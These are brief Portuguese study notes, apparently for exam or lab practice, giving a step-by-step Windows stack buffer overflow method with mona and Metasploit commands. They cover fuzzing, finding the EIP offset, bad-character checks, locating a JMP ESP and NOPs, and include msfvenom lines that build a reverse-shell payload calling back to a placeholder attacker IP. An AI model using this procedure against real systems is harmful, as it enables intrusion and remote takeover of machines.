
#Fuzzing 
Usar o script de fuzzing e encontrar o bytes que crasha

#Criando-Pattern
Com o valor do crash criar um pattern com o valor do crash anterior
msf-pattern_create -l <valor do crash>

#Verificando a distancia com o mona no immunity
!mona findmsp -distance <valor do crash>
procurar o campo onde contem
EIP contains normal pattern: ... (offset XXXX)

tambem pode validar pelo msf


#Encontrando os badchars
Criando o bytearray com o mona
!mona bytearray -b "\x00"

Criando o bytearray com python

for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()

!!! JOGAR ISSO PRA UM ARQUIVO E EXECUTAR !!!!

#executar e comparar com o mona
!mona compare -f <caminho do bytearray.bin> -a <endereco ESP>

#Encontrando um JUMP POINT - Encontrando um endere√ßo de retorno
!mona jmp -r esp -cpb "\x00" - Colocar todos os badchars encontrados

#gerar payload

msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py

#Gerando os NOPS
"\x90" * 16